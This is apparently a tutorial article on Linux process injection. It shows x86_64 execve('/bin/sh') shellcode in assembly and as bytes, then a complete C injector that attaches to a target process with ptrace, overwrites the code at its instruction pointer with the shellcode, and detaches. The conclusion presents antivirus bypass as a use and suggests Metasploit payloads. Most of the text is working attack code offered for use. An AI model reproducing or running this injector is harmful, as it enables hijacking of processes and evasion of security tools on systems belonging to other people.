# Process Injection in Linux using ptrace lib

In this paper, we'll learn about process injection in linux distros using PTRACE.

## Shellcode

First for that, we need our shellcode, i'll use my own, it's avaliable in my github: [_Link Here_](https://github.com/Yyax13/shellcode).

To make it easier, i'll show the shellcode in ASM down here:

```assembly x86_64
section .text
global _start

_start:
    xor rax, rax                        ; rax turns to null byte

    push rax                            ; push \0 (null byte) to the stack
    mov rbx, 0x68732f6e69622f           ; '/bin/sh' string
    push rbx

    mov rdi, rsp                        ; rdi (path) receive rbx ('/bin/sh\0')

    push rax                            ; null byte (execve require {path, NULL})
    push rdi                            ; ptr to our path
    mov rsi, rsp                        ; rsi (argv) receive
    
    xor rdx, rdx
    mov rax, 59
    
    syscall
```

The shellcode:

```c
unsigned char shellcode[] = {
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05

};

```

The .asm has already been documented in the code and in the repo, so i'll not analyze it here.

## The injector

First we need to include everything that we need:

```c
#include <stdio.h>          // printf
#include <stdlib.h>         // NULL
#include <unistd.h>         // getpid and anything else
#include <errno.h>          // for errors
#include <sys/ptrace.h>     // the ptrace lib
#include <sys/wait.h>       // waitpid
#include <sys/user.h>       // type user_regs_struct
#include <sys/types.h>      // pid_t

```


And setup our shellcode:

```c
unsigned char shellcode[] = {
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05

};

size_t shellcodeLen = sizeof(shellcode);
```

After that, we already can start the main function (if you want, you can make a function named "inject" and just call in main, who will just handle the argv).

```c
int main(int argc, char **argv)
```

The argc is args count, contains the count of how many args we used in CLI, the argv is a char* array, that contains the args.

### User input PID parsing

For parsing the PID, we need to handle if user insert the PID in CLI, and after that we parse the INT and cast to pid_t

```c
if (argc < 2) { // If args count is less than 2 (1st is the binary path)
    fprintf(stderr, "Usage: %s <pid>\n", argv[0]); // Print the correct usage
    return 1; // Return 1 (shell understand this like: "Some error occurred")

}

// Convert char* from argv to int (unsafe) and cast to pid_t
pid_t procID = (pid_t)atoi(argv[1]); // atoi do the conversion, but is unsafe, the convention is using strtol instead of atoi
if (procID <= 0) {
    fprintf(stderr, "Invalid PID\n");
    return 1;

}
```

After that we already have the target PID, if you want, you can check if the process really exists.

### Process attaching using PTRACE_ATTACH

After validating target PID, we need to attach it.<br>

> Attaching a process may need root perms, [that article](https://www.kernel.org/doc/Documentation/security/Yama.txt?utm_source=https://github.com/Yyax13/proc_injection) explain how you can check it.

```c
// Attach the PID and check for errors (return -1 = error)
if (ptrace(PTRACE_ATTACH, procID, NULL, NULL) == -1) { // PTRACE_ATTACH just need the PID, so we set NULL, NULL in other args
    perror("Can't attach"); // perror prints smt like: "Can't attach: wow i'm the error message"
    return 1; // End the program

}
```

### Waiting for process

Now, we need to stop the target process, if we don't, we won't be able to overwrite the process RIP.

We can stop using waitpid and the args: `PID, int *status`.

```c
// Wait for target proc stop
int status;
if (waitpid(procID, &status, 0) == -1) { // This '0' can be NULL too
    perror("Can't wait for target");
    goto detach; // Detach ptrace if some error happen

}
```

And check if everything is ok:

```c
// Check if proc successfuly stopped
if (!WIFSTOPPED(status)) { // WIFSTOPPED expands to (((status) & 0xff) == 0x7f) and check if the process stopped
    fprintf(stderr, "Target did not stop as expected\n");
    goto detach;

}
```

### Getting target process registers and RIP

> If you don't know what are "registers", you can read [this article](https://blog.codingconfessions.com/p/linux-context-switching-internals?utm_source=https://github.com/Yyax13/proc_injection)

Now, the process already is stopped, so we can get some info:

```c
// Get target registers of process
struct user_regs_struct regs; // Initialize the variable
if (ptrace(PTRACE_GETREGS, procID, 0, &regs) == -1) { // Use PTRACE_GETREGS with the args procID, 0, &regs to get the process registers (that '0' can be NULL)
    perror("Can't get target regs");
    goto detach;

}
```

Now, we have all registers, but we need to get the RIP, and it's easier than get registers:

```c
unsigned long address = regs.rip; // Just get the rip from regs struct
printf("Target RIP: 0x%llx\n", (unsigned long long)address); // Log
```

### Overwriting the RIP

Now we already can overwrite the RIP to insert our malicious shellcode (in that case, just spawn /bin/sh, but you can use a metasploit shellcode for example):

```c
size_t wordSize = sizeof(unsigned long); // Use sizeof because some CPU archs is different than 8
size_t nWords = (shellcodeLen + wordSize - 1) / wordSize; // Ceiling division: shellcode + wordsize - 1

for (size_t i = 0; i < nWords; i++) {
    unsigned long word = 0; // Current word
    size_t base = i * wordSize; // Base, is the offset in bytes

    // For loop that write the word byte-to-byte
    for (size_t ii = 0; ii < wordSize; ii++) {
        size_t idx = base + ii; // Current base + current byte
        unsigned char byte = (idx < shellcodeLen) ? shellcode[idx] : 0x90; // Create the byte (padding with 0x90 if needed)
        word |= ((unsigned long)byte) << (8 * ii); // I don't knew that, a |= b means a = a | b, it's a OR bit operator, and the << is a bit more complicated for that comment, article down

    }

    /*
      POKETEXT writes a word in the address of the process
      in our case, we use it to write our word in address + base (rip + current offset)
    */
    if (ptrace(PTRACE_POKETEXT, procID, (void*)(address + base), (void*)word) == -1) {
        perror("Some error occurred in POKETEXT");
        goto detach;

    }

    printf("Wrote 0x%lx --> 0x%llx\n", word, (unsigned long long)(address + base)); // Log

}
```

> If you don't know what is a word, read [this article](https://www.techtarget.com/whatis/definition/word?utm_source=pornhub.com)<br>
> If you don't know what is the byte order, read [this article](https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/?utm_source=roblox.com)<br>
> If you don't know what << do, read [this article](https://www.geeksforgeeks.org/cpp/left-shift-right-shift-operators-c-cpp/?utm_source=xvideos.com)

Injection done! Now we just need to detach the process and have fun

### Detaching the process

This is the final step, we just need to detach:

```c
if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) { // Very simple, i think that we don't need to explain that
    perror("Can't detach target");
    return 1;

}
```

### Error handling

If you really read this paper, you saw `goto detach` some times, and here is the `detach` label:

```c
detach: 
    if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) {
        perror("Can't detach target");
        
    }

    return 1;
```

## Conclusion

Process injection is a very interesting topic, and can be used in many ways, for example, to bypass some AVs, or to make a process run something that it don't need to run.

![[Demo in tria.ge](https://tria.ge/250929-vfegeaaj8w)](sandbox.png)

---

> Article by [@hoWo](https://github.com/Yyax13)